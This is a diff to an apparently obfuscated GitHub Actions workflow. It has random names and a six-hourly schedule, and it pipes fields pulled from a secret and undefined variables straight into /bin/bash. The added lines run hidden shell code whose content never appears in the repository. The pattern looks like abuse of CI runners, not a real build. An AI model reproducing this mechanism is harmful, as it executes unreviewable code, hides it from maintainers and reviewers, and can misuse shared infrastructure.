@@ -1,25 +1,26 @@
 name: yaowenyuan4198
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '51 4/6 * * *'
-
+    - cron: '17 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: yaowenyuan4198
         env:
-          c70: ${{ secrets.c70 }}
+          ewh7: ${{ secrets.ewh7 }}
         run: |
-          echo $c70 | jq -r .py2502 | /bin/bash
-          echo $lim2 | jq -r .j4 | /bin/bash
-          echo $iykgd664 | jq -r .fqw69 | /bin/bash
-          echo $p06619 | jq -r .dmfjr92 | /bin/bash
-          echo $gv72 | jq -r .nm58589 | /bin/bash
-          echo $kdgh26114 | jq -r .jk9952 | /bin/bash
-          echo $kg794 | jq -r .i8 | /bin/bash
+          echo $ewh7 | jq -r .nkbhy4447 | /bin/bash
+          echo $nu8213 | jq -r .ir80404 | /bin/bash
+          echo $hcsmj269 | jq -r .ea5908 | /bin/bash
+          echo $kecbf0 | jq -r .ecru47 | /bin/bash
+          echo $eqa0 | jq -r .l658 | /bin/bash
+          echo $xtzr3 | jq -r .vycka49918 | /bin/bash
+          echo $x99665 | jq -r .g74 | /bin/bash
+          echo $tmuqv93482 | jq -r .psugl52851 | /bin/bash
+          echo $b33 | jq -r .bwl035 | /bin/bash
+          echo $c013 | jq -r .zmpf41285 | /bin/bash
+          echo $fww5259 | jq -r .xh280 | /bin/bash
 
